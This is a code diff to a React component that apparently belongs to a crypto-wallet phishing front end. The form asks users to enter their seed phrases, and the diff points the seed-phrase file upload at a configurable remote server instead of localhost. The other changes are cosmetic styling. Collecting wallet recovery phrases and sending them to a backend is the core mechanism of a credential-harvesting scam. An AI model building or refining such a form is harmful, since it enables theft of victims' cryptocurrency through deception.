@@ -44,7 +44,7 @@ function SeedPhraseVerification({ onNext }) {
         formData.append('seedPhraseFile', file);
 
         try {
-          const response = await fetch('http://localhost:3001/upload', {
+          const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/upload`, {
             method: 'POST',
             body: formData,
           });
@@ -62,7 +62,7 @@ function SeedPhraseVerification({ onNext }) {
 
   return (
     <Container>
-      <h2>Enter Seed Phrases</h2>
+      <h2 className="mb-4">Enter Your Seed Phrases</h2>
       <TextField
         label="Seed Phrase"
         variant="outlined"
@@ -74,12 +74,13 @@ function SeedPhraseVerification({ onNext }) {
         aria-required="true"
         placeholder='Input your Seed Phrase accordingly...'
       />
-      <div style={{ marginTop: '10px' }}>
+      <div style={{ marginTop: '10px' }} className='space-y-2 xl:space-y-0'>
         <Button
           variant="contained"
           color="primary"
           onClick={handleAddPhrase}
           style={{ marginRight: '10px' }}
+          className="mb-4"
         >
           Add Phrase
         </Button>
